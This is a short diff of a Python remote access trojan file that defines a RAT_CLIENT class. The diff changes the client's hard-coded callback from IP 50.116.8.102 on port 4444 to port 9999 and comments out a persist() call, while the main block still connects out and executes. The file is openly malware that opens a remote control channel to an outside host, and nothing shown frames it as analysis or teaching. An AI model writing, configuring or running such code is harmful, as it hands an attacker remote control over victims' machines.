@@ -659,7 +659,7 @@ class RAT_CLIENT:
                 rat.execute()
 
 
-rat = RAT_CLIENT('50.116.8.102', 4444)
+rat = RAT_CLIENT('50.116.8.102', 9999)
 
 
 def persist():
@@ -690,6 +690,6 @@ def persist():
 
 
 if __name__ == '__main__':
-    persist()
+    # persist()
     rat.build_connection()
     rat.execute()
